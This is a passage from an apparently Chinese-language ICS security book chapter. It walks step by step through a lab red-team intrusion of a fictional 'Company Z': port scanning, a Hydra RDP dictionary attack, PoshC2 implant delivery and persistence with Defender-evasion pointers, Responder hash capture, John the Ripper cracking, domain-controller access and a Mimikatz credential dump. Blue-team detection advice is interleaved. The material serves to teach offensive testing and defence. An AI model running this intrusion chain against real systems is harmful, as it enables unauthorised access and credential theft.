  \ IP 地址视为在线（互联网上的设备通常被配置为显示为离线），并使用 `--open` 仅显示开放端口。当扫描完成时，结果令人极度失望，正如我们所见：\n\n\
  ```\n... Nmap scan report for 10.0.0.120\nHost is up (0.00071s latency) .\nNot shown:\
  \ 999 filtered ports\nSome closed ports may be reported as filtered due to --defeat-\n\
  rst-ratelimit\nPORT STATE SERVICE\n80/tcp open http\n\nNmap done: 256 IP addresses\
  \ (256 hosts up) scanned in 1024.26 seconds\n```\n\n此外，查看那个唯一的开放端口发现了一个简单的静态网页——没有特别之处，没有动态内容，也没有任何可供攻击的\
  \ Web 应用程序，正如我们所见：\n\n![](img/c8ffa9959721097701584fcc95101362_616_0.png)\n\n图 16.1\
  \ – Z 公司坚不可摧的网站\n\n我们对运行在 10.0.0.120 上的服务器运行了 Nikto、Nessus 和 Nmap 扫描，但无法找到服务器、Web\
  \ 服务或运行在 Web 服务器上的网页的任何漏洞。是时候开始考虑实地访问工厂了。在准备现场行程的同时，我们应该设置一个定期扫描，以查看我们能否检测到 *Z 公司*\
  \ 公共存在的变化。\n\n## 设置定期扫描\n\n为了定期验证 *Z 公司* 的公共存在是否发生变化（突然出现的额外服务器或开放端口），我们将设置一个简单粗糙的每日端口扫描，以查找\
  \ *Z 公司* 公共姿态的变化。为此，请遵循以下说明：\n\n1. 在 Kali Linux 中运行 `sudo gedit /usr/bin/daily_scan.sh`\
  \ 创建以下脚本，并在脚本中输入以下命令：\n\n```bash\n#!/bin/bash\nmkdir /opt/daily_scan\ntoday=$(date\
  \ +%Y-%m-%d)\nyesterday=$(date -d yesterday +%Y-%m-%d)\n/usr/bin/nmap -T5 -oX /opt/daily_scan/scan_$today.xml\
  \ -n -Pn 10.0.0.0/24 > /dev/null 2>&1\nif [ -e /opt/daily_scan/scan_$yesterday.xml\
  \ ]; then\n    /usr/bin/ndiff /opt/daily_scan/scan_$yesterday.xml /opt/daily_scan/scan_$today.xml\
  \ > /opt/daily_scan/changes_$today.txt\nfi\n```\n\n在脚本中，我们执行每日 Nmap 扫描并保存带有今日日期的结果：`nmap\
  \ -T5 -oX /opt/daily_scan/scan_$today.xml -n -Pn 10.0.0.0/24`。然后使用 `ndiff /opt/daily_scan/scan_$yesterday.xml`\
  \ 将今天的结果与昨天的扫描结果进行比较，并将任何差异存储在 `/opt/daily_scan/changes_$today.txt` 中。\n\n2. 编辑完\
  \ Bash 脚本后，保存文件并关闭 `gedit`。现在，我们将通过运行 `sudo vi /etc/crontab` 命令并在 crontab 文件底部添加以下行，来设置一个\
  \ crontab 任务，使该脚本每天凌晨 1 点运行：\n\n```\n0 1 * * * root /usr/bin/daily_scan.sh\n```\n\
  \n这将指示 Kali Linux 每天凌晨 1 点运行我们的 shell 脚本。注意：crontab 文件是在 Linux 系统上计划重复任务（cron 作业）的一种方式（[https://man7.org/linux/man-pages/man5/crontab.5.html](https://man7.org/linux/man-pages/man5/crontab.5.html)）。\n\
  \n在我们开始探索不同的攻击方法时，现在我们已经针对 *Z 公司* 公共姿态的变化设置了检查机制。\n\n## 蓝队观察\n\n蓝队通常无法检测有人对公共 IP\
  \ 地址范围和物理地址进行公开侦察。然而，他们应该定期检查这些公共资源是否泄露了过多信息。对你的域名进行 WHOIS 查询，并检查敏感信息，如公司电子邮件地址、你不想暴露的电话号码，甚至密码（是的——这种情况确实发生过）。\n\
  \n一旦攻击进入扫描系统阶段，蓝队应该开始注意到防火墙日志中弹出额外的日志。当然，如果你的网页通常有大量流量，或者如果攻击者行动缓慢，这种额外的流量可能不会引起警报。鉴于大多数公共\
  \ IP 地址每天都会被多次进行端口扫描，且这些扫描通常不会导致被入侵，此类噪音变得司空见惯。\n\n## 发现新 IP/服务 – 开始攻击\n\n就在我们收拾行李准备前往\
  \ *Z 公司* 生产工厂进行公路旅行时，我们注意到已经运行了几天的每日脚本检测到 *Z 公司* 公共网络存在的变化。以下是我们在 Kali Linux 机器上生成的\
  \ `ndiff` 文件的内容：\n\n```text\ncat /opt/daily_scan/changes_2021-02-22.txt\n-Nmap 7.91\
  \ scan initiated Mon Feb 22 20:43:47 2021 as: /usr/bin/nmap -T5 -oX /opt/daily_scan/scan_2021-02-22.xml\
  \ -n -Pn 10.0.0.120,125,130,150,157\n+Nmap 7.91 scan initiated Mon Feb 22 20:45:43\
  \ 2021 as: /usr/bin/nmap -T5 -oX /opt/daily_scan/scan_2021-02-22.xml -n -Pn 10.0.0.120,125,130,150,157\n\
  \n10.0.0.157:\n-Not shown: 1000 filtered ports\n+Not shown: 999 filtered ports\n\
  \  PORT      STATE SERVICE       VERSION\n+3389/tcp  open  ms-wbt-server\n```\n\n\
  输出显示 Nmap 扫描发现了一个额外暴露的 IP 地址：`10.0.0.157`。该 IP 地址有一个开放的端口 3389，通常用于 Microsoft **远程桌面协议（RDP）**。\n\
  \n## 使用 Hydra 测试常见用户名和密码\n\n让我们看看 *Z 公司* 公共 IP 地址范围内新出现的服务器是否有任何可利用的漏洞。我们运行了 Nmap\
  \ 和 Nessus 扫描，甚至盲目地在服务器上尝试了 **Metasploit** 中的 **BlueKeep 模块**（https://pentest-tools.com/blog/bluekeep-exploit-metasploit/），但都没有成功。是时候改变策略，看看我们是否能发现一个非常常见的配置错误：容易猜解的凭据。很可能是有人启动了测试或开发服务器并意外地将其暴露在互联网上。在这种情况下，发现更多安全卫生最佳实践中的疏漏（例如弱密码）并不罕见。\n\
  \n在下一节中，我们将使用强大的暴力破解工具 **Hydra**（https://github.com/vanhauser-thc/thc-hydra）在 RDP\
  \ 服务器上测试常见的用户和密码。\n\n我们将对 RDP 服务执行字典攻击。该攻击将尝试常见的用户名和密码，直到列表耗尽或找到一组可用的凭据为止。以下命令将尝试提供的单词列表中的每个用户名和密码组合：\n\
  \n```\n$ hydra -L /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt\
  \ -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top1000.txt 10.0.0.157\
  \ rdp\nHydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use\
  \ in military or secret service organizations, or for illegal purposes (this is\
  \ non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra)\
  \ starting at 2021-02-22 17:08:47\n[WARNING] rdp servers often don't like many connections,\
  \ use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3\
  \ to wait between connection to allow the server to recover\n[INFO] Reduced number\
  \ of tasks to 4 (rdp does not like many parallel connections)\n[WARNING] the rdp\
  \ module is experimental. Please test, report - and if possible, fix.\n[WARNING]\
  \ Restorefile (you have 10 seconds to abort... (use option -I to skip waiting))\
  \ from a previous session found, to prevent overwriting, ./hydra.restore\n```\n\n\
  \n\n\n\n```\n[DATA] max 4 tasks per 1 server, overall 4 tasks, 827172 login tries\
  \ (1:828/p:999), ~206793 tries per task\n\n[DATA] attacking rdp://10.0.0.157:3389/\n\
  \n[STATUS] 1040.00 tries/min, 1040 tries in 00:01h, 826133 to do in 13:15h, 4 active\n\
  \n[STATUS] 1050.33 tries/min, 3151 tries in 00:03h, 824022 to do in 13:05h, 4 active\n\
  \n[STATUS] 1053.57 tries/min, 7375 tries in 00:07h, 819798 to do in 12:59h, 4 active\n\
  ...\n```\n\n如你所见，这将耗时很长（超过13小时）。但在红队演练中，我们有时间——目标是进入系统，而不是求快。\n\n不过，Hydra 最终会找到一组可用于该服务器的凭据，如下所示：\n\
  \n```\n...\n[3389] [rdp] host: 10.0.0.157  login: reports_user  password: Password1\n\
  1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra)\
  \ finished at 2021-02-22 17:31:19\n```\n\n请注意，用户名和密码本身并不罕见，但必须找到两者的组合，才使得此类攻击的挑战性大大增加，耗时也更长。如果你能预先掌握其中一项——用户名或密码——那将极大地有所帮助。\n\
  \n令我困惑的是，现代 Windows 系统在默认安装时竟然仍然允许使用 `Password1` 这样简单的密码。\n\n为了展示这种攻击的嘈杂程度，请看下面的截图，它展示了我们执行字典攻击时企业防火墙的运行日志：\n\
  \n![](img/c8ffa9959721097701584fcc95101362_621_0.png)\n\n图16.2 – 暴力破解攻击期间的防火墙日志\n\
  \n其中有数千条到 RDP 服务器的成功连接记录。\n\n有了用户名和密码，接下来让我们攻击*Z公司*的企业网络。\n\n## 蓝队观察\n\n与我们之前执行端口扫描时产生的事件一样，成功连接的日志常常会与其他日志混杂在一起，除非专门查找此类事件，否则很难被发现。但令人警惕的是，服务器暴露出来，可以从互联网访问。一定是有人配置了企业防火墙，允许通过\
  \ 3389 端口进行入站连接。这可能是残留的端口例外，仅仅因为选择了错误的 IP 地址而导致内部服务器暴露。\n\n这里给蓝队的三点启示是：\n\n- 蓝队的**安全信息和事件管理/安全运营中心（SOC）**解决方案应进行调整，以开始显示过多的成功连接。\n\
  - 企业防火墙的防火墙规则需要定期审查和验证。\n- 应建立一个暴露 IP 地址监控服务。像**Shodan的** `https://monitor.shodan.io/`\
  \ 这样的服务会密切关注公司暴露的服务器/服务的变化，并针对这些变化发出警报。\n\n## 初始立足点 – 攻陷企业网络\n\n我们现在有了一组可用的凭据，可以登录*Z公司*的\
  \ RDP 服务器。我们将使用一个名为 **Remmina** 的 Linux RDP 客户端来完成此操作。Remmina 不会随 Kali Linux 默认安装，因此我们需要使用以下命令来安装它：\n\
  \n```\nsudo apt install remmina\n```\n\n现在我们可以启动 Remmina 并指定远程服务器和凭据，如下所示：\n\n![](img/c8ffa9959721097701584fcc95101362_623_0.png)\n\
  \n点击**保存并连接...**，我们就进去了！这通过以下截图得以确认：\n\n![](img/c8ffa9959721097701584fcc95101362_623_1.png)\n\
  \n现在，我们该如何利用新获得的访问权限？很可能有人会发现错误并关闭防火墙例外，或禁用此服务器上的 RDP 服务。此外，RDP 会话很难保持隐秘——我们很可能会意外暴露自己的存在。我们需要建立一种隐秘的方式进入系统，同时也要能持久化，以防\
  \ RDP 访问方式消失。实现这些需求的方式是使用一个日益流行的**命令与控制（C2）**框架：**PoshC2**。\n\n### 使用 PoshC2 建立进入\
  \ Z 公司企业网络的持久且隐蔽的连接\n\n本节并非要作为使用 PoshC2 框架的完整教程，因为许多在线资源都可以提供帮助。我们只是要浅尝辄止地了解该工具的功能。不过，我建议熟悉\
  \ PoshC2，因为它正被攻击者越来越多地使用。\n\n我们使用 C2 设置的原因是为了利用植入体——安装在目标系统上的小型代理程序，它们允许我们在受感染系统和\
  \ C2 服务器之间建立隐蔽信道。植入体内置了多种功能，帮助我们执行各种攻击和活动，非常适合隐蔽侦察。此外，C2 环境支持设置持久化，并可以帮助我们扩展和穿越目标网络，所有这些都可以方便地在\
  \ C2 指挥中心终端中完成。让我们看看 PoshC2 的实际使用，但在此之前，我们需要先安装它。要安装 PoshC2，我们从 Kali Linux **虚拟机（VM）**\
  \ 运行以下命令：\n\n```bash\ncurl -sSL https://raw.githubusercontent.com/nettitude/PoshC2/master/Install.sh\
  \ | sudo bash\n```\n\n这一条命令就能完成所有 PoshC2 文件的安装。\n\nPoshC2 的安装程序完成后，我们必须使用 posh-project\
  \ -n Book_ENT-C2 创建一个项目，如下面的截图所示，之后我们可以使用 posh-server 启动 C2 服务器：\n\n![](img/c8ffa9959721097701584fcc95101362_625_0.png)\n\
  \n图16.5 – PoshC2 服务器启动并运行\n\n如图16.5的输出所示，PoshC2 会生成各种负载，并将它们存储在 /var/poshc2/Book_ENT-C2/payloads/\
  \ 文件夹中。我们将把这些负载复制到 Kali Linux 机器的 /var/www/html/files/payloads 文件夹中，以便通过 apache2\
  \ Web 服务器将其暴露。以下输出显示了负载文件的复制和 apache 服务的启动：\n\n```\n$ sudo mkdir /var/www/html/files/\n\
  $ sudo cp /var/poshc2/Book_ENT-C2/payloads/ /var/www/html/files -r\n$ sudo service\
  \ apache2 start\n```\n\n就这样，我们准备从 Z 公司的终端服务器上获取一个合适的 PoshC2 植入体负载。\n\n在我们进入测试服务器的\
  \ RDP 会话中，打开 Internet Explorer 并导航到 http://222.222.222.222/files，如下图所示：\n\n![](img/c8ffa9959721097701584fcc95101362_626_0.png)\n\
  \n图16.6 – Kali Web 服务器上的 PoshC2 负载列表\n\n让我们保持简单，下载 `payload.bat` 文件。这是一个批处理文件，它将运行\
  \ PoshC2 的 PowerShell 版本的植入体。你可以在下面的截图中看到下载过程：\n\n![](img/c8ffa9959721097701584fcc95101362_627_0.png)\n\
  \n图16.7 – 已下载的 Payload.bat\n\n如果我们用记事本打开（编辑）`payload.bat` 文件，可以看到该批处理文件的内容，如下所示：\n\
  \n![](img/c8ffa9959721097701584fcc95101362_627_1.png)\n\n图16.8 – payload.bat 的内容\n\
  \n运行它时，我们可以看到植入体回连到 Kali 机器上的 PoshC2 服务器，如下所示：\n\n![](img/c8ffa9959721097701584fcc95101362_627_2.png)\n\
  \n图16.9 – PoshC2 植入体连接到服务器\n\n> **注意**\n> \n> 在某些 Windows Server 系统上，植入体的部分内容会被\
  \ Windows Defender 标记。为避免检测，请按照本文中的说明操作：https://github.com/nettitude/PoshC2/issues/164。\n\
  \n现在，我们已通过 PoshC2 植入体建立了连接，首先要做的事情是设置持久化，这样即使目标重启或我们意外失去连接，植入体也会自动开始尝试重新连接 PoshC2\
  \ 服务器。要与 PoshC2 植入体交互，我们需要在新的终端窗口中运行 posh，如下所示：\n\n![](img/c8ffa9959721097701584fcc95101362_628_0.png)\n\
  \n我们可以通过输入植入体 ID（8）开始与植入体交互。这会带我们进入 `\\implant` 命令菜单。从这里运行 `install-persistence`，让\
  \ PoshC2 在目标上设置一个持久化植入体，如下所示：\n\n```\nTEST_REPORTSSER\\reports_user @ TEST_REPORTSSER\
  \ (PID:2188)\nPS 8> install-persistence\n```\n\n这会安装持久化模块，如 posh-server 终端中所示：\n\
  \n![](img/c8ffa9959721097701584fcc95101362_628_1.png)\n\n我们现在拥有了一条可靠的通向 Z 公司企业网络的后门。是时候开始探索环境了。\n\
  \n### 蓝队观察\n\n在攻击的这一点上，如果蓝队的工具被调校为可发现进入企业网络的连接，那么他们应该开始看到一些异常。看到来自互联网的入站 RDP 连接绕过非军事区（DMZ）进入企业网络，应该非常可疑。另外，对通过超文本传输协议（HTTP）进行的下载进行监控也是一项措施，但实施起来更难。诸如\
  \ BAT、EXE、SYS 等可执行文件格式应引起警惕。这很难实施，因为误报的可能性很大。\n\n\n\n\n补充蓝队观察结果，我们有以下几点：\n\n- 来自互联网的内部连接应受到密切监控。\n\
  - 可执行文件格式的下载行为应被监控。\n\n## 企业侦察\n\n此时，我们已建立起到*Z公司*企业网络的持久连接。接下来我们要执行的活动将是探索环境，看看能否找到其他（有趣的）可被利用的系统。由于目标是在自动化设备上执行固件升级，我们应首先弄清楚\
  \ PLC 在网络中的位置。为了测试运气并查看我们是否处于一个扁平网络（即业务设备和自动化设备位于同一网络/子网中），我们可以扫描本地网络，看看能否找到任何 ICS\
  \ 设备。PoshC2 植入体中内置了若干扫描功能，可以为我们完成此任务。其中一个功能是 `arpscan`。我们运行以下命令：\n\n```\nTEST_REPORTSSER\\\
  reports_user @ TEST_REPORTSSER (PID:5976)\nPS 12> arpscan\n```\n\n上述命令列出了我们所在的*Z公司*企业网络分段上的所有系统，如下所示：\n\
  \n![](img/c8ffa9959721097701584fcc95101362_629_0.png)\n\n图 16.12 – 运行 arpscan 植入体功能\n\
  \n现在我们可以获取媒体访问控制（MAC）地址，并通过在线工具（如 https://macvendors.com/）查找厂商，如下图所示：\n\n![](img/c8ffa9959721097701584fcc95101362_630_0.png)\n\
  \n图 16.13 – MAC 地址查询\n\n如果我们找到任何自动化厂商，我们就知道接下来该关注何处。此外，我们可以对发现的系统执行端口扫描，查看是否存在通常出现在自动化设备上的开放端口，例如\
  \ 2222、44818、502 等。植入体中使用的函数是 portscan，如下所示：\n\n```\nTEST_REPORTSSER\\reports_user\
  \ @ TEST_REPORTSSER (PID:5976)\nPS 12> portscan 10.0.0.100\n```\n\n这显示了 posh-server\
  \ 界面上 10.0.0.100 的开放端口，如下所示：\n\n![](img/c8ffa9959721097701584fcc95101362_630_1.png)\n\
  \n图 16.14 – 运行 portscan 植入体功能\n\n> **注意**\n>\n> 我们可以设置一个 **Socket Secure (SOCKS)**\
  \ 代理服务器，并让我们的植入体通过它隧道传输来自攻击者机器的流量。这样，我们就可以使用诸如 Nmap 等熟悉的工具来扫描网络。\n\n要在*Z公司*网络中设置\
  \ SOCKS5 代理，请遵循以下说明：\n\n1. 在植入体处理器界面中输入 `sharpsocks`。随后，植入体处理器界面会立即打印出一行包含在攻击者端启动\
  \ SOCKS 服务器参数的信息。复制该命令行并将其粘贴到一个新的终端（注意：不是植入体处理器终端）。\n2. 一旦新终端中的服务器启动，切换回植入体处理器界面并输入\
  \ `Y` 以将 `sharpsocks` 命令发送到植入体。输出现在应显示植入体已启动。如果已启动，您应该可以看到 SOCKS 代理正在监听端口（默认为端口\
  \ 43334）。\n3. 配置 `proxychains` 或其他支持 SOCKS 代理的工具，设置为 `localhost:43334`。\n4. 现在我们可以开始使用代理服务器了。\n\
  \n以下截图显示了这些活动的概览：\n\n![](img/c8ffa9959721097701584fcc95101362_631_0.png)\n\nSOCKS\
  \ 代理连接将在我们开始向*Z公司*网络深处进行跳板操作时使用。\n\n经过广泛的侦察，我们意识到通往胜利的道路并不像我们希望的那么简单。*Z公司*似乎对其网络进行了分段，以更好地保护其工业系统。我们需要弄清楚是否有任何企业系统能够访问该分段网络。我们可以尝试查找一些域凭据，并尝试连接到网络上的每台机器，寻找该系统用于访问工业设备的证据。别忘了，我们有充足的时间来完成我们的目标。然而，如果我们退后一步思考片刻，为什么不查找*Z公司*是否有已知的控制工程师，并了解该人员拥有什么权限？社交媒体使这类研究变得极其简单。在\
  \ LinkedIn 上简单搜索*Z公司*的工程师就能得到几个可以尝试的名字，如下所示：\n\n![](img/c8ffa9959721097701584fcc95101362_632_0.png)\n\
  \n图 16.16 – 在 LinkedIn 上搜索*Z公司*的工程师\n\n我们可以看到以下人员正在*Z公司*从事工程职位：\n\n- **Ann Harbor**\n\
  - **Joe Smith**\n- **Mark Gibson**\n- **Marina Soeters**\n\n在侦察过程中，我们发现*Z公司*的用户名由用户名字首字母与其姓氏拼接而成，例如\
  \ Jane Doe 对应 jdoe，这给我们提供了以下需要查找的用户名：\n\n- `Aharbor`\n- `Jsmith`\n- `Mgibson`\n\
  - `Msoeters`\n\n有了这个列表，我们可以在企业网络中进行嗅探、探测和搜索，直到找到一个可被这些用户之一访问或正在被访问的系统。如果我们处于域加入的计算机上，这将是一个\
  \ PowerShell 练习，甚至可能使用 **BloodHound** (https://github.com/BloodHoundAD/BloodHound)。然而，我们所在的测试服务器并未连接到\
  \ lab-domain.local Windows 域（通过 get-computerinfo 植入体命令发现）。\n\n为了弄清楚这些用户中的任何一个登录在哪里，我们需要将自己转移到一台域加入的计算机上，以便开始使用\
  \ PowerShell 命令进行探测。我喜欢在 Windows 域环境活动中使用 PowerShell 的原因是，这类命令能很好地融入 Windows 机器上的正常活动。我们使用的工具越奇特，它们触发警报或被防病毒软件检测到的可能性就越大。这通常被称为\
  \ **利用本土工具 (Living off the Land, LotL)**，即使用环境中常见的工具。我们需要在域加入的计算机上建立立足点的原因是，我们所需的功能在域加入的计算机上更容易获取。此外，我们要运行的命令不太可能被检测到，因为它们被域成员常用。要进入域成员机器，我们需要找到一台存在漏洞的域加入计算机，或者设法获取凭据。在我开始使用嘈杂工具扫描网络之前，我喜欢看看能否从网络上获取一些哈希凭据。一个仍然是查找这些凭据的最佳选择之一的工具是\
  \ **Spiderlabs** (https://github.com/SpiderLabs/Responder) 开发的 Responder，描述如下：\n\
  \n> Responder 是一个 LLMNR、NBT-NS 和 MDNS 毒化工具。它会根据名称后缀回答特定的 NBT-NS (NetBIOS 名称服务) 查询（参见：http://support.microsoft.com/kb/163409）。默认情况下，该工具仅回答文件服务器服务请求，即\
  \ SMB。\n>\n> 背后的概念是使我们的回答具有针对性，并在网络上保持更隐蔽。这也有助于确保我们不破坏合法的 NBT-NS 行为。如果您希望回答工作站服务请求名称后缀，可以通过命令行设置\
  \ -r 选项。\n\nResponder 工具最初是为 Python 开发的，后来被 **Lgandx** (https://github.com/lgandx)\
  \ fork 为 Windows 可执行文件。Windows 版本的下载链接为 `https://github.com/lgandx/Responder-Windows/raw/master/binaries/Responder/Responder.exe`。\n\
  \n我们可以使用 Invoke-WebRequest 将该可执行文件下载到 RDP 服务器，如下所示：\n\n```\nTEST_REPORTSSER\\reports_user\
  \ @ TEST_REPORTSSER (PID:5976)\nPS 12> invoke-webrequest -Uri \"https://github.com/lgandx/Responder-Windows/raw/master/binaries/Responder/Responder.exe\"\
  \ -outfile responder.exe\n```\n\n![](img/c8ffa9959721097701584fcc95101362_634_0.png)\n\
  \n现在运行 `responder.exe` 工具并坐等结果，如下所示：\n\n![](img/c8ffa9959721097701584fcc95101362_635_0.png)\n\
  \n图 16.18 – 运行 responder.exe\n\n一段时间后，我们看到 responder 从网络中嗅探到了 `admin1` 的凭据。它们是 `admin1`\
  \ 用户的**新技术 LAN 管理器 (NTLM)** 哈希值，根据我们的侦察，我们知道这是一个域管理员账户。这些可以在以下截图中看到：\n\n![](img/c8ffa9959721097701584fcc95101362_635_1.png)\n\
  \n图 16.19 – Responder 发现的 admin1 的 NTLMv2 哈希值\n\n\n\n\n看起来 admin1 意外尝试访问 \\\\client1。Responder\
  \ 工具利用了这个失误，迅速发送了伪造的响应，并成功让客户端计算机（10.0.0.130）发送了 admin1 用户的 NTLMv2 哈希凭据。\n\n我们可以用\
  \ **John the Ripper**（https://www.openwall.com/john/）尝试暴力破解这些凭据，如下所示：\n\n```\n$\
  \ john /home/pac/workdir/hashes --wordlist=/usr/share/wordlists/rockyou.txt --rules=All\n\
  \nUsing default input encoding: UTF-8\nLoaded 1 password hash (netntlmv2, NTLMv2\
  \ C/R [MD4 HMAC-MD5 32/64])\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort,\
  \ almost any other key for status\n0g 0:00:05:25 0.23% (ETA: 2021-03-01 08:45) 0g/s\
  \ 3168Kp/s 3168Kc/s 3168KC/s inkice123)..infinite42)\n0g 0:00:05:28 0.23% (ETA:\
  \ 2021-03-01 08:54) 0g/s 3176Kp/s 3176Kc/s 3176KC/s nambo01*..nakata4434493*\n0g\
  \ 0:00:11:56 0.40% (ETA: 2021-03-01 18:25) 0g/s 3504Kp/s 3504Kc/s 3504KC/s jezalynning..jetmairing\n\
  SouthEastWlcThunder-2020      (admin1)\n1g 0:12:20:12 DONE (2021-02-27 17:00) 1000.0g/s\
  \ 1000.0p/s 1000.0c/s 1000.0C/s SouthEastWlcThunder-2020\nSession completed\n```\n\
  \n前一段代码片段中的命令指示 John the Ripper 从 /home/pac/workdir/hashes 加载 admin1 的哈希，并尝试用 /usr/share/wordlists/rockyou.txt\
  \ 列表中的每个密码对其进行测试。我们指示 John the Ripper 额外根据 John the Ripper 规则对密码进行变异，我们使用 --rules=All\
  \ 指定了该规则。\n\nJohn the Ripper 遍历所有这些密码和变异需要很长时间，但最终我们破解了 lab-domain\\admin1 域管理员账户的密码：SouthEastWlcThunder-2020。\n\
  \n> **注意**\n> \n> 随 Kali 提供的 rockyou.txt 标准词表（标准词表）不包含密码的完全匹配项，但由于我们指示 John the\
  \ Ripper 使用 --rules=All 使用转换规则，我们还是成功破解了密码。\n\n我们现在可以使用破解的凭据远程连接到域控制器。在尝试并失败使用多种远程访问工具，包括\
  \ Psexec.py、wmiexec.py 等之后，我最终使用 evil-winrm（https://github.com/Hackplayers/evil-winrm）通过我们之前设置的\
  \ SOCKS 代理成功建立了连接。这只证明你永远不会拥有足够多的工具。\n\n使用的命令如下所示：\n\n```\nproxychains evil-winrm\
  \ -i 10.0.0.100 -u admin1@lab-domain.local.\n```\n\n我们连接域控制器的原因是它具有我们需要的 PowerShell\
  \ 功能来在域计算机的海量数据中查找用户（Get-AdComputer）。我们可以在暴露此功能的 Active Directory（AD）模块上找到域成员，或将其安装在已加入域的机器上，但由于我们拥有域管理员账户，风险似乎更小，直接连接到域控制器并使用已安装的\
  \ PowerShell 模块。\n\n在运行 evil-winrm 之后，我们现在已通过 Windows 远程管理（WinRM）协议的 shell 会话连接到公司\
  \ Z 企业网络的域控制器，如以下屏幕截图所示：\n\n![](img/c8ffa9959721097701584fcc95101362_637_0.png)\n\
  \n图 16.20 – 通过 ProxyChains 和 sharpsocks 使用 evil-winrm\n\n我们现在可以开始搜索域计算机，看看是否能找到四名工程师中的一人已登录，如下所示：\n\
  \n+ 首先，让我们使用 get-adcomputer PowerShell 命令查看所有域计算机：\n\n```\nPS [C:\\Users\\admin1\\\
  Documents> get-adcomputer -Filter * | select name\n\n[S-chain] ->127.0.0.1:43334->>10.0.0.100:5985->>OK\n\
  [S-chain] ->127.0.0.1:43334->>10.0.0.100:5985->>OK\n\nname\n----\nLAB-DC1\nMEMBER-SRV1\n\
  WIN10-1\nWIN7-1\nWIN8-1\nENT-SQL\nWIN10-2\nWIN10-3\nENT-IIS\nWIN7-2\n```\n\n+ 使用\
  \ get-adcomputer 的输出作为输入（管道传输），我们对每个域计算机运行 get-ciminstance -classname win32_computersystem\
  \ 命令，如下所示：\n\n```\nget-ciminstance -classname win32_computersystem\n-computername\
  \ (get-adcomputer -filter * | select\n-expandproperty name) | select name, Username:\n\
  ```\n\nget-ciminstance PowerShell 脚本将在遍历每个域计算机时查询 Windows Management Instrumentation（WMI）数据库中的\
  \ win32_computersystem 数据，使用 get-adcomputer -filter * | select -expandproperty name，并选择\
  \ name、username 将提取计算机名称和当前登录用户的用户名。\n\n输出看起来像这样：\n\n```\n...\nname    Username\n\
  ----    ---------\nMEMBER-SRV1\nWIN8-1\nENT-SQL    LAB-DOMAIN\\administrator\nENT-IIS\n\
  WIN10-1    LAB-DOMAIN\\mgibson\nLAB-DC1    LAB-DOMAIN\\administrator\nWIN10-3\n\
  ...\n```\n\n我们找到了感兴趣的系统... WIN10-1。让我们在上面投放一个 implant 并继续前进。\n\n## 蓝队观察\n\n由于我们主要坚持使用原生的\
  \ Windows 工具，这种类型的活动很难被蓝队发现。看到 TEST_REPORTSSER（SOCKS 代理的出口点）与域控制器之间的连接可能令人怀疑，但找到该连接就像在大海捞针一样。一种好的方法是监控进入域控制器的每个交互式连接（通过终端、RDP\
  \ 会话或本地或通过系统控制台）。此外，如果已配置 Server Message Block（SMB）签名（https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing），responder\
  \ 工具将很难获取 admin1 的哈希凭据。将这些观察添加到列表中：\n\n- 监控进入域控制器的交互式连接。\n- 配置 SMB 签名以防止将凭据发送到未知\
  \ SMB 服务器。\n\n在 implant 终端运行以下命令以安装服务级持久化：\n\n```\nLAB-DOMAIN\\admin1* @ WIN10-1\
  \ (PID:8432)\nPS 26> install-servicelevel-persistence\nPayload to use: payload.bat\n\
  ```\n\n该命令现在按如下方式安装 implant 服务：\n\n![](img/c8ffa9959721097701584fcc95101362_641_0.png)\n\
  \n图 16.23 – 在 WIN10-1 上安装持久化服务\n\n就这样，我们在目标企业系统中创建了一个永久的、特权的（域管理员）implant。让我们开始四处窥探。\n\
  \n## 蓝队观察\n\n横向移动仍然是蓝队最难监控的事情之一。网络上计算机之间的连接不断发生，除非我们跟踪行为（谁在何时连接到哪里），否则几乎不可能检测到异常。本节中讨论的横向移动的一个方面是服务的创建。这种活动应该足够罕见，使得监控该事件是可行的，并允许快速发现潜在的恶意活动。你可以在这里看到一个服务的创建：\n\
  \n![](img/c8ffa9959721097701584fcc95101362_641_1.png)\n\n图 16.24 – 服务创建事件\n\n将服务创建事件的监控添加到可观察工件（蓝队能力）列表中。\n\
  \n## 进入工业网络的枢纽\n\n现在我们坐在一台可能用于与工业设备通信的工程工作站上，让我们四处看看一些明显的东西。首先，许多用户会缓存各种凭据，例如网站、共享文件夹和远程桌面会话的凭据。我们可以让我们的\
  \ implant 使用 get-wmi regcachedrdpconnection 查找缓存的 RDP 凭据。运行此命令显示了一个名为 workstation10.ot-domain.local\
  \ 的目标服务器的缓存条目，如以下屏幕截图所示：\n\n![](img/c8ffa9959721097701584fcc95101362_642_0.png)\n\
  \n看起来很有希望！此输出告诉我们 mgibson 缓存（保存）了其用于连接到 workstation10.ot-domain.local 服务器的凭据，根据其名称我们怀疑它是一个自动化系统。我们将尝试破解\
  \ mgibson 的密码（通过从内存中获取其哈希）或使用 Mimikatz 在内存中找到明文密码。然后我们将使用我们的代理或进入测试服务器的 RDP 会话通过\
  \ RDP 连接到 Mark Gibson 的计算机。为了不被发现，我们已经做了功课（侦察）并确定 WIN10-1 和 TEST_REPORTSSER 在晚上\
  \ 9 点到凌晨 4 点之间是废弃的（无人使用）。剩下的就是找到 mgibson 的密码。让我们先尝试 mimikatz 方法。在 WIN10-1 implant\
  \ 上运行 invoke-mimikatz 命令会给我们大量信息，其中最有趣的部分是这一节：\n\n| ... |\n| Authentication Id :\
  \ 0 ; 409389 (00000000:00063f2d) |\n| Session : Interactive from 1 |\n| User Name\
  \ : mgibson |\n| Domain : LAB-DOMAIN |\n| Logon Server : LAB-DC1 |\n| Logon Time\
  \ : 2/27/2021 5:30:01 PM |\n| SID : S-1-5-21-158492451-1268741517-1484628790-1608\
  \ |\n| msv : |\n\n\n```\n[00000003] Primary\n* Username : mgibson\n* Domain : LAB-DOMAIN\n\
  * NTLM : 58a478135a93ac3bf058a5ea0e8fdb71\n* SHA1 : 0d7d930ac3b1322c8a1142f9b22169d4eef9e855\n\
  * DPAPI : 9459fcdd28401cb34262404420e63d7a\ntspkg :\nwdigest :\n* Username : mgibson\n\
  * Domain : LAB-DOMAIN\n* Password : (null)\nkerberos :\n* Username : mgibson\n*\
